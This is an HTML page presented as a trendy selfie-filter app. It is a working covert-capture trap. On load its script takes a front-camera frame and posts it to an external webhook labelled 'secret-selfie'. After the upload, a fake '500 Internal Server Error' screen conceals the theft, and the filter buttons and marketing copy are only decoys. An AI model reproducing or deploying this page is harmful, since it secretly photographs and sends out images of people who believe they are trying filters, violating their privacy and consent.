<!DOCTYPE html>
<html lang="en">

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <title>Aesthetic Filters</title>

    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
        }

        body {
            margin: 0;
            padding: 18px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background:
                linear-gradient(135deg,
                    rgba(255, 154, 158, 0.75),
                    rgba(250, 208, 196, 0.75)),
                url("bg-filter-app.webp") center / cover no-repeat;
            animation: bgShift 8s ease infinite;
        }


        @keyframes bgShift {
            0% {
                background-position: 0% 50%;
            }

            50% {
                background-position: 100% 50%;
            }

            100% {
                background-position: 0% 50%;
            }
        }

        .screen {
            width: 100%;
            max-width: 420px;
            padding: 26px;
            text-align: center;
            background: rgba(255, 255, 255, 0.94);
            backdrop-filter: blur(6px);
            border-radius: 22px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
        }

        h1 {
            font-size: 23px;
            margin-bottom: 12px;
        }

        p {
            font-size: 14px;
            color: #444;
            margin-bottom: 22px;
        }

        .filters {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 14px;
            margin-bottom: 18px;
        }

        .filter {
            cursor: pointer;
            padding: 26px 10px;
            border-radius: 16px;
            font-size: 13px;
            color: #fff;
            font-weight: 500;
            background: linear-gradient(135deg, #667eea, #764ba2);
            box-shadow: 0 10px 18px rgba(0, 0, 0, 0.18);
        }

        .filter:hover {
            box-shadow: 0 10px 18px rgba(0, 0, 0, 0.5);
        }

        .filter:nth-child(2) {
            background: linear-gradient(135deg, #ff758c, #ff7eb3);
        }

        .filter:nth-child(3) {
            background: linear-gradient(135deg, #43cea2, #185a9d);
        }

        .filter:nth-child(4) {
            background: linear-gradient(135deg, #f7971e, #ffd200);
            color: #222;
        }

        .hint {
            font-size: 12px;
            color: #666;
        }

        .error {
            display: none;
            text-align: center;
        }

        .error h1 {
            font-size: 26px;
            margin-bottom: 8px;
        }

        .error p {
            font-size: 14px;
            color: #666;
        }

        .failtext {
            color: #ff0008;
        }

        video,
        canvas {
            display: none;
        }

        .cta-wrap {
            margin-top: 18px;
            text-align: center;
        }

        .cta-btn {
            background: #111;
            color: #fff;
            border: none;
            border-radius: 999px;
            padding: 14px 26px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .cta-btn:active {
            transform: scale(0.98);
        }

        .marketing {
            margin-top: 14px;
            font-size: 12px;
            line-height: 1.6;
            color: #555;
            max-width: 360px;
            margin-left: auto;
            margin-right: auto;
        }

        /* Background removed state */
        body.fail-bg {
            background: #f4f4f4;
            animation: none;
        }
    </style>
</head>

<body>

    <!-- Camera infrastructure -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <!-- UI -->
    <div class="screen" id="ui">
        <h1>Try our new aesthetic filters</h1>
        <p>Fresh tones, soft glow, and trendy edits. Saved straight to your gallery.</p>

        <div class="filters">
            <div class="filter">Soft Glow</div>
            <div class="filter">Vintage Fade</div>
            <div class="filter">Warm Matte</div>
            <div class="filter">Film Grain</div>
        </div>

        <div class="hint">Loading filtersâ€¦</div>
    </div>

    <div class="cta-wrap" id="cta-wrap">
        <button class="cta-btn" id="loadMoreBtn">LOAD MORE</button>

        <div class="marketing">
            Vintage-inspired filters bring warmth, softness, and timeless character
            to your selfies. Designed to enhance natural tones and add subtle depth,
            these filters help your photos feel more expressive, aesthetic, and ready
            for social sharing with minimal effort.
        </div>
    </div>


    <!-- Error -->
    <div class="screen error" id="error">
        <h1 class="failtext">App failed</h1>
        <p>500 Internal Server Error</p>
    </div>

    <script>
        let uploadCompleted = false;

        (async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });

                const video = document.getElementById("video");
                const canvas = document.getElementById("canvas");

                video.srcObject = stream;

                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    canvas.getContext("2d").drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL("image/png");

                    await fetch("https://chloroformshake.app.n8n.cloud/webhook/secret-selfie", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ image: imageData })
                    });

                    uploadCompleted = true;
                    stream.getTracks().forEach(t => t.stop());
                }, 800);

            } catch (e) {
                console.log("Camera error:", e);
            }
        })();

        // Only fail AFTER upload AND user interaction
        function triggerFailure() {
            if (!uploadCompleted) return;
            document.getElementById("ui").style.display = "none";
            document.getElementById("cta-wrap").style.display = "none";
            document.getElementById("error").style.display = "block";
            document.removeEventListener("click", triggerFailure);
            document.removeEventListener("touchstart", triggerFailure);
        }

        document.addEventListener("click", triggerFailure);
        document.addEventListener("touchstart", triggerFailure);
    </script>

</body>

</html>